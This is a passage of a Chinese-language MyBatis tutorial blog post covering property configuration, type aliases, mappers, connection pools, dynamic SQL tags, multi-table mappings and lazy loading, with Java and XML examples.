value=&quot;com.mysql.jdbc.Driver&quot;/&gt;        &lt;property name=&quot;jdbc.url&quot;                  value=&quot;jdbc:mysql://localhost:3306/my_batis?useUnicode=true&amp;amp;characterEncoding=utf8&quot;/&gt;        &lt;property name=&quot;jdbc.username&quot; value=&quot;root&quot;/&gt;        &lt;property name=&quot;jdbc.password&quot; value=&quot;&quot;/&gt;    &lt;/properties&gt;</code></pre><p>2、第二种   ：</p><p> 在 classpath (类路径，resources目录即为根 类路径) 下定义 db.properties 文件<br><img src="http://img-blog.csdnimg.cn/20201107144401778.png" alt="在这里插入图片描述"></p><p>db.properties 文件内容：</p><pre><code class="java">jdbc.driver=com.mysql.jdbc.Driverjdbc.url=jdbc:mysql://localhost:3306/my_batis?useUnicode=true&amp;characterEncoding=utf8jdbc.username=rootjdbc.password=</code></pre><p>注意：db.properties 文件中 数据库连接，指定编码格式不能用 <code>&amp;amp;</code> 需改为 <code>&amp;</code></p><p>配置信息：</p><pre><code class="xml"> &lt;properties resource=&quot;db.properties&quot;&gt; &lt;/properties&gt;</code></pre><p>此时我们的 dataSource 标签就变成了引用上面的配置：</p><pre><code class="xml">      &lt;!--配置数据源/连接池--&gt;    &lt;dataSource type=&quot;POOLED&quot;&gt;        &lt;property name=&quot;driver&quot; value=&quot;$&#123;jdbc.driver&#125;&quot;/&gt;        &lt;property name=&quot;url&quot; value=&quot;$&#123;jdbc.url&#125;&quot;/&gt;        &lt;property name=&quot;username&quot; value=&quot;&#123;$jdbc.username&#125;&quot;/&gt;        &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot;/&gt;    &lt;/dataSource&gt;</code></pre><p><strong>2、typeAliases（类型别名）</strong>：、</p><p>自定义别名：</p><p>在 SqlMapConfig.xml 中配置：</p><pre><code class="xml">&lt;typeAliases&gt;&lt;!-- 单个别名定义 --&gt;&lt;typeAlias type=&quot;com.itheima.domain.User&quot; alias=&quot;user&quot;/&gt;&lt;!-- 批量别名定义，扫描整个包下的类，别名为类名（首字母大写或小写都可以）--&gt;&lt;package name=&quot;com.smk.domain&quot;/&gt;&lt;package name=&quot;其它包&quot;/&gt;&lt;/typeAliases&gt;</code></pre><p><strong>3、mappers（映射器）</strong>：</p><p><code>&lt;mapper resource=&quot; &quot;/&gt;</code> 使用相对于类路径的资源，如：</p><pre><code class="java">&lt;mapper resource=&quot;com/smk/dao/IUserDao.xml&quot; /&gt;</code></pre><p><code>&lt;mapper class=&quot; &quot;/&gt;</code> 使用 mapper 接口类路径，如：</p><pre><code class="java">&lt;mapper class=&quot;com.smk.dao.UserDao&quot;/&gt;</code></pre><p>package 标签是用于指定dao接口所在的<strong>包</strong>，当指定了之后，就不需要再写 mapper标签以及 resource 或者 class 了</p><p>在 SqlMapConfig.xml 中配置：</p><p><code> &lt;package name=&quot;&quot;/&gt;</code> 注册指定包下的所有 mapper 接口，如：</p><pre><code class="java">&lt;mappers&gt;     &lt;package name=&quot;com.smk.dao&quot;/&gt;&lt;/mappers&gt;</code></pre><p>注意：此种方法要求 mapper 接口名称和 mapper 映射文件名称相同，且放在同一个目录中。<br><img src="http://img-blog.csdnimg.cn/2020110715394491.png" alt="在这里插入图片描述"></p><h4 id="七、Mybatis-连接池"><a href="#七、Mybatis-连接池" class="headerlink" title="七、Mybatis 连接池"></a>七、Mybatis 连接池</h4><h5 id="1、Mybatis-的连接池技术："><a href="#1、Mybatis-的连接池技术：" class="headerlink" title="1、Mybatis 的连接池技术："></a>1、Mybatis 的连接池技术：</h5><p> 在 web 开发中，常使用连接池技术来减少我们获取连接所消耗的时间；在 Mybatis 中也有连接池技术，但是它采用的是自己的连接池技术。在 Mybatis 的 SqlMapConfig.xml 配置文件中，通过 <code>&lt;dataSource type = &quot;&quot;&gt;</code> 来实现 Mybatis 中连接池的配置。</p><p><strong>1.1、Mybatis 连接池的分类</strong>：</p><p>mybatis连接池提供了3种方式的配置：</p><p>配置的位置：</p><ul><li>主配置文件SqlMapConfig.xml中的dataSource标签，type属性就是表示采用何种连接池方式。</li></ul><p>type属性的取值：</p><ul><li>POOLED     使用连接池的数据源</li><li>UNPOOLED 不使用连接池的数据源</li><li>JNDI     使用 JNDI 实现的数据源</li></ul><p>具体结构如下：<br><img src="http://img-blog.csdnimg.cn/20201108181835759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>相应地，MyBatis 内部分别定义了实现了 java.sql.DataSource 接口的 UnpooledDataSource，PooledDataSource 类来表示 UNPOOLED、POOLED 类型的数据源。</p><p><strong>1.2、Mybatis 中数据源的配置</strong>：</p><p>在SqlMapConfig.xml 进行配置</p><pre><code class="xml">&lt;dataSource type=&quot;POOLED&quot;&gt;    &lt;property name=&quot;driver&quot; value=&quot;$&#123;jdbc.driver&#125;&quot;/&gt;    &lt;property name=&quot;url&quot; value=&quot;$&#123;jdbc.url&#125;&quot;/&gt;    &lt;property name=&quot;username&quot; value=&quot;$&#123;jdbc.username&#125;&quot;/&gt;    &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot;/&gt;&lt;/dataSource&gt;</code></pre><p>Mybatis 在初始化时，根据<code>&lt;dataSource&gt;</code>的 type 属性来创建相应类型的的数据源 DataSource，即：</p><ul><li>type=” POOLED “：MyBatis 会创建 PooledDataSource 实例。</li><li>type=” UNPOOLED “： MyBatis 会创建 UnpooledDataSource 实例。</li><li>type=” JNDI “：MyBatis 会从 JNDI 服务上查找 DataSource 实例，然后返回使用。</li></ul><h4 id="八、Mybatis的动态SQL语句"><a href="#八、Mybatis的动态SQL语句" class="headerlink" title="八、Mybatis的动态SQL语句"></a>八、Mybatis的动态SQL语句</h4><p><strong>1、动态sql之<code>&lt;if&gt;</code>标签</strong>：</p><ul><li>根据实体类的不同取值，使用不同的 SQL 语句来进行查询。比如在 id 如果不为空时可以根据 id 查询，如果 username 不为空时还要加入用户名作为条件。这种情况在我们的多条件组合查询中经常会碰到。</li></ul><p>1、持久层 Dao 接口：</p><pre><code class="java">    //根据用户信息，查询用户列表    List&lt;User&gt; findByUser(User user);</code></pre><p>2、持久层 Dao 映射配置：</p><pre><code class="java">    &lt;select id=&quot;findByUser&quot; resultMap=&quot;userMap&quot; parameterType=&quot;user&quot;&gt;        select * from user where 1=1        &lt;if test=&quot;userName!=null and userName != &#39;&#39; &quot;&gt;            and username like #&#123;userName&#125;        &lt;/if&gt;        &lt;if test=&quot;userAddress != null&quot;&gt;            or address like #&#123;userAddress&#125;        &lt;/if&gt;    &lt;/select&gt;</code></pre><p>注：where 1=1 是为了避免 where 关键字后面的第一个词直接就是 “ and “ 而导致语法错误。</p><p>3、 测试：</p><pre><code class="java"> @Test    public void testFindByUser() &#123;        User u = new User();        u.setUserName(&quot;%王%&quot;);        u.setUserAddress(&quot;%顺义%&quot;);        //6.执行操作        List&lt;User&gt; users = userDao.findByUser(u);        for (User user : users) &#123;            System.out.println(user);        &#125;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201109233820528.png#pic_center" alt="在这里插入图片描述"><br>可以看到，带 “王” 的用户和地址带 “顺义” 的用户信息全查询出来了。</p><p><strong>2、动态sql 之 <code>&lt;where&gt;</code>标签</strong>： </p><p>为了简化上面 where 1=1 的条件拼装，可以采用 <code>&lt;where&gt;</code> 标签来简化开发。</p><p>1、持久层 Dao 映射配置:</p><pre><code class="java">    &lt;select id=&quot;findByUser&quot; resultMap=&quot;userMap&quot; parameterType=&quot;user&quot;&gt;        select * from user        &lt;where&gt;            &lt;if test=&quot;userName!=null and userName != &#39;&#39; &quot;&gt;                and username like #&#123;userName&#125;            &lt;/if&gt;            &lt;if test=&quot;userAddress != null&quot;&gt;                or address like #&#123;userAddress&#125;            &lt;/if&gt;        &lt;/where&gt;    &lt;/select&gt;</code></pre><p><strong>3、动态标签之<code>&lt;foreach&gt;</code>标签</strong>：</p><p>在进行范围查询时，就要将一个集合中的值，作为参数动态添加进来。<br>这样将如何进行参数的传递？</p><p>1、在 QueryVo 中加入一个 List 集合用于封装参数：</p><pre><code class="java">public class QueryVo &#123;    private User user;    private List&lt;Integer&gt; ids;    public List&lt;Integer&gt; getIds() &#123;        return ids;    &#125;    public void setIds(List&lt;Integer&gt; ids) &#123;        this.ids = ids;    &#125;    public User getUser() &#123;        return user;    &#125;    public void setUser(User user) &#123;        this.user = user;    &#125;&#125;</code></pre><p>2、持久层 Dao 接口：</p><pre><code class="java">    // 根据 id 集合查询用户    List&lt;User&gt; findInIds(QueryVo vo);</code></pre><p>3、持久层 Dao 映射配置：</p><pre><code class="java">    &lt;select id=&quot;findInIds&quot; resultMap=&quot;userMap&quot; parameterType=&quot;queryVo&quot;&gt;        select * from user        &lt;where&gt;            &lt;if test=&#39;ids !=null and ids.size&gt;0&#39;&gt;                &lt;foreach collection=&quot;ids&quot; open=&quot;id in (&quot; close=&quot;)&quot; item=&quot;id&quot; separator=&quot;,&quot;&gt;                    #&#123;id&#125;                &lt;/foreach&gt;            &lt;/if&gt;        &lt;/where&gt;    &lt;/select&gt;</code></pre><p>SQL 语句：</p><ul><li>select 字段 from user where id in (?)</li></ul><p><code>&lt;foreach&gt;</code> 标签用于遍历集合，它的属性：</p><ul><li>collection:代表要遍历的集合元素，注意编写时不要写#{}</li><li>open：代表语句的开始部分</li><li>close：代表结束部分</li></ul><p>4、 测试：</p><pre><code class="java">    @Test    public void testFindInIds() &#123;        QueryVo vo = new QueryVo();        List&lt;Integer&gt; ids = new ArrayList&lt;Integer&gt;();        ids.add(41);        ids.add(42);        ids.add(43);        ids.add(46);        ids.add(57);        vo.setIds(ids);        //6.执行操作        List&lt;User&gt; users = userDao.findInIds(vo);        for (User user : users) &#123;            System.out.println(user);        &#125;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201110204140134.png#pic_center" alt="在这里插入图片描述"></p><p><strong>4、Mybatis 中简化编写的 sql 片段</strong>：</p><p>Sql 中可将重复的 sql语句 提取出来，使用时用 include 引用即可，最终达到 sql 重用的目的。</p><p>1、定义代码片段：</p><pre><code class="xml">    &lt;!-- 抽取重复的语句代码片段 --&gt;    &lt;sql id=&quot;defaultSql&quot;&gt;        select * from user    &lt;/sql&gt;</code></pre><p>2、引用代码片段：</p><pre><code class="xml">    &lt;!-- 配置查询所有操作 --&gt;    &lt;select id=&quot;findAll&quot; resultType=&quot;user&quot;&gt;        &lt;include refid=&quot;defaultSql&quot;&gt;&lt;/include&gt;    &lt;/select&gt;    &lt;!-- 根据 id 查询 --&gt;    &lt;select id=&quot;findById&quot; resultType=&quot;UsEr&quot; parameterType=&quot;int&quot;&gt;        &lt;include refid=&quot;defaultSql&quot;&gt;&lt;/include&gt;        where id = #&#123;uid&#125;    &lt;/select&gt;</code></pre><h4 id="九、Mybatis多表查询一对一（多对一）"><a href="#九、Mybatis多表查询一对一（多对一）" class="headerlink" title="九、Mybatis多表查询一对一（多对一）"></a>九、Mybatis多表查询一对一（多对一）</h4><p>**1、一对一查询(多对一)**：</p><p>以最为简单的用户和账户的模型来分析 Mybatis 多表关系。用户为 User 表，账户为Account表。<br>一个用户（User）可以有一个或多个账户（Account）。</p><p><strong>需求</strong>：</p><p>查询所有账户信息，关联查询下单用户信息（只要用户名和地址）。</p><p><strong>注意</strong>：</p><p>因为一个账户信息只能供某一个用户使用，所以从查询账户信息出发，关联查询用户信息为一对一查询。如果从用户信息出发，查询用户下的账户信息则为一对多查询，因为一个用户可以有多个账户。</p><p><strong>方式一</strong>：</p><p>1、定义账户信息的实体类：</p><pre><code class="java">public class Account implements Serializable &#123;    private Integer id;    private Integer uid;    private Double money;    public Integer getId() &#123;        return id;    &#125;    public void setId(Integer id) &#123;        this.id = id;    &#125;    public Integer getUid() &#123;        return uid;    &#125;    public void setUid(Integer uid) &#123;        this.uid = uid;    &#125;    public Double getMoney() &#123;        return money;    &#125;    public void setMoney(Double money) &#123;        this.money = money;    &#125;    @Override    public String toString() &#123;        return &quot;Account&#123;&quot; +                &quot;id=&quot; + id +                &quot;, uid=&quot; + uid +                &quot;, money=&quot; + money +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>2、定义 AccountUser 类：</p><p>为了能够封装上面 SQL 语句的查询结果，定义 AccountCustomer 类中要包含账户信息同时还要包含用户信息，所以在定义 AccountUser 类时可以继承 User 类。</p><pre><code class="java">public class AccountUser extends Account implements Serializable &#123;    private String username;    private String address;    public String getUsername() &#123;        return username;    &#125;    public void setUsername(String username) &#123;        this.username = username;    &#125;    public String getAddress() &#123;        return address;    &#125;    public void setAddress(String address) &#123;        this.address = address;    &#125;    @Override    public String toString() &#123;        return super.toString() + &quot;      AccountUser&#123;&quot; +                &quot;username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, address=&#39;&quot; + address + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>3、定义持久层 Dao 接口：</p><pre><code class="java">    /**     * 查询所有用户，带有用户名和地址信息     * @return     */    List&lt;AccountUser&gt; findAllAccount();</code></pre><p>4、定义 IAccountDao.xml 文件中的查询配置信息：</p><pre><code class="xml">    &lt;!--查询所有账户同是包含用户名和地址信息--&gt;    &lt;select id=&quot;findAllAccount&quot; resultType=&quot;accountuser&quot;&gt;      select a.*,u.username,u.address from account a,user u where a.uid =u.id;    &lt;/select&gt;</code></pre><p>5、创建 AccountTest 测试类：</p><pre><code class="java">    @Test    public void testFindAllAccount() &#123;        List&lt;AccountUser&gt; aus = accountDao.findAllAccount();        for (AccountUser au : aus) &#123;            System.out.println(au);        &#125;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201112163952263.png#pic_center" alt="在这里插入图片描述"></p><p>小结：</p><p>定义专门的 po 类作为输出类型，其中定义了 sql 查询结果集所有的字段。此方法较为简单，企业中使用普遍。</p><p>po: (persistant object）持久对象，可以看成是与数据库中的表相映射的java对象。</p><p><strong>方式二</strong>：</p><p>使用 resultMap，定义专门的 resultMap 用于映射一对一查询结果。</p><p>我们可以在 Account 类中加入一个 User 类的对象来代表这个账户是哪个用户的。</p><p>1、在 Account 类中加入 User 类的对象作为 Account 类的一个属性：</p><pre><code class="java">public class Account implements Serializable &#123;    private Integer id;    private Integer uid;    private Double money;    private User user;    public User getUser() &#123;        return user;    &#125;    public void setUser(User user) &#123;        this.user = user;    &#125;    public Integer getId() &#123;        return id;    &#125;    public void setId(Integer id) &#123;        this.id = id;    &#125;    public Integer getUid() &#123;        return uid;    &#125;    public void setUid(Integer uid) &#123;        this.uid = uid;    &#125;    public Double getMoney() &#123;        return money;    &#125;    public void setMoney(Double money) &#123;        this.money = money;    &#125;    @Override    public String toString() &#123;        return &quot;Account&#123;&quot; +                &quot;id=&quot; + id +                &quot;, uid=&quot; + uid +                &quot;, money=&quot; + money +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>2、修改 AccountDao 接口中的方法：</p><pre><code class="java">   List&lt;Account&gt; findAllAccount();</code></pre><p>把 AccountUser 改为 Account</p><p>3、重新定义 AccountDao.xml 文件：</p><pre><code class="xml">&lt;!-- 建立对应关系 --&gt;    &lt;resultMap type=&quot;account&quot; id=&quot;accountMap&quot;&gt;        &lt;id column=&quot;aid&quot; property=&quot;id&quot;/&gt;        &lt;result column=&quot;uid&quot; property=&quot;uid&quot;/&gt;        &lt;result column=&quot;money&quot; property=&quot;money&quot;/&gt;        &lt;!-- 它是用于指定 从表 方的引用实体属性的 --&gt;        &lt;association property=&quot;user&quot; javaType=&quot;user&quot;&gt;            &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt;            &lt;result column=&quot;username&quot; property=&quot;username&quot;/&gt;            &lt;result column=&quot;sex&quot; property=&quot;sex&quot;/&gt;            &lt;result column=&quot;birthday&quot; property=&quot;birthday&quot;/&gt;            &lt;result column=&quot;address&quot; property=&quot;address&quot;/&gt;        &lt;/association&gt;    &lt;/resultMap&gt;    &lt;select id=&quot;findAllAccount&quot; resultMap=&quot;accountMap&quot;&gt;      select u.*,a.id as aid,a.uid,a.money from account a,user u where a.uid =u.id;    &lt;/select&gt;</code></pre><p>注：</p><ul><li>a.id as aid ：这里两个表的字段重复了所以需要起别名。</li><li>javaType=” user “：即指定数据类型为user类，全限定类名或者别名（此处为别名）。</li></ul><p>4、加入测试方法：</p><pre><code class="java">    @Test    public void testFindAllAccount() &#123;        List&lt;Account&gt; accounts = accountDao.findAllAccount();        for (Account account : accounts) &#123;            System.out.println(account);            System.out.println(account.getUser());        &#125;    &#125;</code></pre><p>测试结果：</p><p><img src="http://img-blog.csdnimg.cn/20201112174242274.png#pic_center" alt="在这里插入图片描述"><br><strong>2、 一对多查询</strong>：</p><p>需求：</p><ul><li>查询所有用户信息及用户关联的账户信息。</li></ul><p>分析：</p><ul><li>用户信息和他的账户信息为一对多关系，并且查询过程中如果用户没有账户信息，此时也要将用户信息查询出来，此时应该使用左外连接查询比较合适。</li></ul><p>1、User 类加入 List <code>&lt;Account&gt;</code>：</p><pre><code class="java">public class User implements Serializable &#123;    private Integer Id;    private String username;    private String Address;    private String Sex;    private Date Birthday;    private List&lt;Account&gt; accounts;    public List&lt;Account&gt; getAccounts() &#123;        return accounts;    &#125;    public void setAccounts(List&lt;Account&gt; accounts) &#123;        this.accounts = accounts;    &#125;    public Integer getId() &#123;        return Id;    &#125;    public void setId(Integer Id) &#123;        this.Id = Id;    &#125;    public String getUsername() &#123;        return username;    &#125;    public void setUsername(String username) &#123;        this.username = username;    &#125;    public String getAddress() &#123;        return Address;    &#125;    public void setAddress(String address) &#123;        Address = address;    &#125;    public String getSex() &#123;        return Sex;    &#125;    public void setSex(String sex) &#123;        Sex = sex;    &#125;    public Date getBirthday() &#123;        return Birthday;    &#125;    public void setBirthday(Date birthday) &#123;        Birthday = birthday;    &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;Id=&quot; + Id +                &quot;, username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, Address=&#39;&quot; + Address + &#39;\&#39;&#39; +                &quot;, Sex=&#39;&quot; + Sex + &#39;\&#39;&#39; +                &quot;, Birthday=&quot; + Birthday +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>2、 Dao 接口中加入查询方法：</p><pre><code class="java">    List&lt;User&gt; findAll();</code></pre><p>3、Dao 映射文件配置：</p><pre><code class="xml">    &lt;resultMap type=&quot;user&quot; id=&quot;userMap&quot;&gt;        &lt;id column=&quot;id&quot; property=&quot;id&quot;&gt;&lt;/id&gt;        &lt;result column=&quot;username&quot; property=&quot;username&quot;/&gt;        &lt;result column=&quot;address&quot; property=&quot;address&quot;/&gt;        &lt;result column=&quot;sex&quot; property=&quot;sex&quot;/&gt;        &lt;result column=&quot;birthday&quot; property=&quot;birthday&quot;/&gt;        &lt;!-- collection 是用于建立一对多中集合属性的对应关系        ofType 用于指定集合元素的数据类型        --&gt;        &lt;collection property=&quot;accounts&quot; ofType=&quot;account&quot;&gt;            &lt;id column=&quot;aid&quot; property=&quot;id&quot;/&gt;            &lt;result column=&quot;uid&quot; property=&quot;uid&quot;/&gt;            &lt;result column=&quot;money&quot; property=&quot;money&quot;/&gt;        &lt;/collection&gt;    &lt;/resultMap&gt;    &lt;!--查询所有--&gt;    &lt;select id=&quot;findAll&quot; resultMap=&quot;userMap&quot;&gt;        select u.*,a.id as aid ,a.uid,a.money from user u left outer join account a on u.id =a.uid    &lt;/select&gt;</code></pre><p>注：<br>collection：</p><ul><li>部分定义了用户关联的账户信息。表示关联查询结果集</li></ul><p>property=” accList “ ：</p><ul><li>关联查询的结果集存储在 User 对象的上哪个属性。</li></ul><p>ofType=” account “：</p><ul><li>指定关联查询的结果集中的对象类型即List中的对象类型。此处可以使用别名，也可以使用全限定名。</li></ul><p>4、 测试方法：</p><pre><code class="java">    @Test    public void testFindAll() &#123;        List&lt;User&gt; users = userDao.findAll();        for (User user : users) &#123;            System.out.println(&quot;用户的信息：&quot;);            System.out.println(user);            System.out.println(user.getAccounts());        &#125;    &#125;</code></pre><p>5、运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201114111944114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h4 id="十、-Mybatis-多表查询——多对多"><a href="#十、-Mybatis-多表查询——多对多" class="headerlink" title="十、 Mybatis 多表查询——多对多"></a>十、 Mybatis 多表查询——多对多</h4><p><strong>1、实现 Role 到 User 多对多</strong>：</p><p>1、编写 Role 实体类：</p><pre><code class="java">public class Role implements Serializable &#123;    private Integer roleId;    private String roleName;    private String roleDesc;    private List&lt;User&gt; users;    public List&lt;User&gt; getUsers() &#123;        return users;    &#125;    public void setUsers(List&lt;User&gt; users) &#123;        this.users = users;    &#125;    public Integer getRoleId() &#123;        return roleId;    &#125;    public void setRoleId(Integer roleId) &#123;        this.roleId = roleId;    &#125;    public String getRoleName() &#123;        return roleName;    &#125;    public void setRoleName(String roleName) &#123;        this.roleName = roleName;    &#125;    public String getRoleDesc() &#123;        return roleDesc;    &#125;    public void setRoleDesc(String roleDesc) &#123;        this.roleDesc = roleDesc;    &#125;    @Override    public String toString() &#123;        return &quot;Role&#123;&quot; +                &quot;roleId=&quot; + roleId +                &quot;, roleName=&#39;&quot; + roleName + &#39;\&#39;&#39; +                &quot;, roleDesc=&#39;&quot; + roleDesc + &#39;\&#39;&#39; +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>2、编写 Role 持久层接口：</p><pre><code class="java">    /**     * 查询所有角色     * @return     */    List&lt;Role&gt; findAll();</code></pre><p>3、编写映射文件：</p><pre><code class="xml">&lt;mapper namespace=&quot;com.itheima.dao.IRoleDao&quot;&gt;    &lt;!--定义role表的ResultMap--&gt;    &lt;resultMap id=&quot;roleMap&quot; type=&quot;role&quot;&gt;        &lt;id property=&quot;roleId&quot; column=&quot;rid&quot;&gt;&lt;/id&gt;        &lt;result property=&quot;roleName&quot; column=&quot;role_name&quot;&gt;&lt;/result&gt;        &lt;result property=&quot;roleDesc&quot; column=&quot;role_desc&quot;&gt;&lt;/result&gt;        &lt;collection property=&quot;users&quot; ofType=&quot;user&quot;&gt;            &lt;id column=&quot;id&quot; property=&quot;id&quot;&gt;&lt;/id&gt;            &lt;result column=&quot;username&quot; property=&quot;username&quot;&gt;&lt;/result&gt;            &lt;result column=&quot;address&quot; property=&quot;address&quot;&gt;&lt;/result&gt;            &lt;result column=&quot;sex&quot; property=&quot;sex&quot;&gt;&lt;/result&gt;            &lt;result column=&quot;birthday&quot; property=&quot;birthday&quot;&gt;&lt;/result&gt;        &lt;/collection&gt;    &lt;/resultMap&gt;    &lt;!--查询所有--&gt;    &lt;select id=&quot;findAll&quot; resultMap=&quot;roleMap&quot;&gt;       select u.*,r.id as rid,r.role_name,r.role_desc from role r       left outer join user_role ur on r.id = ur.rid       left outer join user u on u.id = ur.uid    &lt;/select&gt;&lt;/mapper&gt;</code></pre><p>4、测试类：</p><pre><code class="java">    /**     * 测试查询所有     */    @Test    public void testFindAll() &#123;        List&lt;Role&gt; roles = roleDao.findAll();        for (Role role : roles) &#123;            System.out.println(&quot;---每个角色的信息----&quot;);            System.out.println(role);            System.out.println(role.getUsers());        &#125;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201115145411115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>2、实现 User 到 Role 的多对多</strong>：</p><p>大体步骤和上面同理，其中sql语句需改为：</p><pre><code class="sql"> select u.*,r.id as rid,r.role_name,r.role_desc from user u       left outer join user_role ur on u.id = ur.rid       left outer join role r on r.id = ur.uid</code></pre><h4 id="十一、-Mybatis-延迟加载策略"><a href="#十一、-Mybatis-延迟加载策略" class="headerlink" title="十一、 Mybatis 延迟加载策略"></a>十一、 Mybatis 延迟加载策略</h4><p>通过前面的学习，我们已经掌握了 Mybatis 中一对一，一对多，多对多关系的配置及实现，可以实现对象的关联查询。实际开发过程中很多时候我们并不需要总是在加载用户信息时就一定要加载他的账户信息。此时就是我们所说的延迟加载。</p><p><strong>1、何为延迟加载</strong>?</p><p> 就是在需要用到数据时才进行加载，不需要用到数据时就不加载数据。延迟加载也称懒加载。</p><p> 好处：</p><ul><li>先从单表查询，需要时再从关联表去关联查询，大大提高数据库性能，因为查询单表要比关联查询多张表速度要快。</li></ul><p>坏处：</p><ul><li>因为只有当需要用到数据时，才会进行数据库查询，这样在大批量数据查询时，因为查询工作也要消耗时间，所以可能造成用户等待时间变长，造成用户体验下降。</li></ul><p><strong>2、使用 assocation 实现延迟加载</strong>：</p><p>需求：</p><ul><li>查询账户(Account) 信息并且关联查询用户(User) 信息。如果先查询账户(Account) 信息即可满足要求，当我们需要查询用户(User) 信息时再查询用户(User) 信息。把对用户(User) 信息的按需去查询就是延迟加载。</li></ul><p>1、DAO 接口：</p><pre><code class="java">  List&lt;Account&gt; findAll();</code></pre><p>2、持久层映射文件：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE mapper        PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;&gt;&lt;mapper namespace=&quot;com.itheima.dao.IAccountDao&quot;&gt;    &lt;!-- 建立对应关系 --&gt;    &lt;resultMap type=&quot;account&quot; id=&quot;accountMap&quot;&gt;        &lt;id column=&quot;id&quot; property=&quot;id&quot;/&gt;        &lt;result column=&quot;uid&quot; property=&quot;uid&quot;/&gt;        &lt;result column=&quot;money&quot; property=&quot;money&quot;/&gt;        &lt;!-- 它是用于指定从表方的引用实体属性的 --&gt;        &lt;association property=&quot;user&quot; javaType=&quot;user&quot;                     select=&quot;com.itheima.dao.IUserDao.findById&quot;                     column=&quot;uid&quot;&gt;        &lt;/association&gt;    &lt;/resultMap&gt;    &lt;select id=&quot;findAll&quot; resultMap=&quot;accountMap&quot;&gt;      select * from account    &lt;/select&gt;&lt;/mapper&gt;</code></pre><p>其中：</p><ul><li>select： 填写我们要调用的 select 映射的 id</li><li>column ： 填写我们要传递给 select 映射的参数</li></ul><p>3、User 的持久层接口和映射文件：</p><pre><code class="java">User findById(Integer userId); </code></pre><pre><code class="xml">&lt;!--根据 id 查询--&gt;&lt;select id=&quot;findById&quot; resultType=&quot;user&quot; parameterType=&quot;int&quot; &gt;    select * from user where id = #&#123;uid&#125;&lt;/select&gt;</code></pre><p>4、开启 Mybatis 的延迟加载策略：</p><p>在 SqlMapConfig.xml 中配置</p><pre><code class="xml">    &lt;!--开启延迟加载的支持--&gt;    &lt;settings&gt;        &lt;setting name=&quot;lazyLoadingEnabled&quot; value=&quot;true&quot;/&gt;        &lt;setting name=&quot;aggressiveLazyLoading&quot; value=&quot;false&quot;/&gt;    &lt;/settings&gt;</code></pre><ul><li>lazyLoadingEnabled：延迟加载的全局开关。当开启时，所有关联对象都会延迟加载。 </li><li>aggressiveLazyLoading：当开启时，任何方法的调用都会加载该对象的所有属性。否则，每个属性会按需加载。</li></ul><p>5、测试查询用户信息时：</p><pre><code class="java">@Test    public void testFindAll() &#123;        List&lt;Account&gt; accounts = accountDao.findAll();        for (Account account : accounts) &#123;            System.out.println(&quot;每个account的信息：--------------&quot;);            System.out.println(account);            System.out.println(account.getUser());        &#125;    &#125;</code></pre><p>测试结果：</p><p><img src="http://img-blog.csdnimg.cn/20201116230506709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以看到SQL语句全部执行了。</p><p>6、测试只查账户信息不查用户信息：</p><pre><code class="java">@Test    public void testFindAll() &#123;        List&lt;Account&gt; accounts = accountDao.findAll();       /* for (Account account : accounts) &#123;            System.out.println(&quot;每个account的信息：--------------&quot;);            System.out.println(account);            System.out.println(account.getUser());        &#125;*/    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201116231408878.png#pic_center" alt="在这里插入图片描述"><br>可以看到只执行了一条SQL语句，即执行了延迟加载。</p><p><strong>3、使用 Collection 实现延迟加载</strong>：</p><p>同样我们也可以在一对多关系配置的<code>&lt;collection&gt;</code>结点中配置延迟加载策略。<code>&lt;collection&gt;</code>结点中也有 select 属性，column 属性。</p><p>需求：</p><ul><li>完成加载用户对象时，查询该用户所拥有的账户信息。</li></ul><p>1、 User 实体类：</p><pre><code class="java">public class User implements Serializable &#123;    private Integer Id;    private String username;    private String Address;    private String Sex;    private Date Birthday;    private List&lt;Account&gt; accounts;    public List&lt;Account&gt; getAccounts() &#123;        return accounts;    &#125;    public void setAccounts(List&lt;Account&gt; accounts) &#123;        this.accounts = accounts;    &#125;    public Integer getId() &#123;        return Id;    &#125;    public void setId(Integer Id) &#123;        this.Id = Id;    &#125;    public String getUsername() &#123;        return username;    &#125;    public void setUsername(String username) &#123;        this.username = username;    &#125;    public String getAddress() &#123;        return Address;    &#125;    public void setAddress(String address) &#123;        Address = address;    &#125;    public String getSex() &#123;        return Sex;    &#125;    public void setSex(String sex) &#123;        